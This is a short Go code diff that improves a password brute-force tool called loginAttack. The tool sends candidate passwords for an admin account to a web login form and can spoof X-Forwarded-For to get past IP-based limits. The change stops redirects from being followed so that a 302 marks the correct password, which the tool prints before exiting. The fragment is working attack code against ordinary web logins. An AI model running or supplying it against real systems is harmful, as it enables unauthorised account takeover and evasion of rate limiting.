@@ -7,7 +7,7 @@ import (
 	"flag"
 	"net/url"
 	"bufio"
-	"bytes"
+	"strings"
 )
 
 type Options struct {
@@ -53,17 +53,19 @@ func loginAttack(options *Options) {
 		data.Set("inputEmail", "admin@example.com")
 		data.Set("inputPassword", password)
 
-		client := &http.Client{}
-		request, _ := http.NewRequest("POST", endpoint, bytes.NewBufferString(data.Encode()))
+		request, _ := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
+		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 		if options.From != "" {
 			request.Header.Add("X-Forwarded-For", options.From)
 		}
-		response, _ := client.Do(request)
+
+		transport := http.Transport{}
+		response, _ := transport.RoundTrip(request)
 		defer response.Body.Close()
 
-		fmt.Println(response.Status)
 		if (response.StatusCode == 302) {
 			fmt.Println("The password is:", password)
+			os.Exit(0)
 		}
 	}
 }
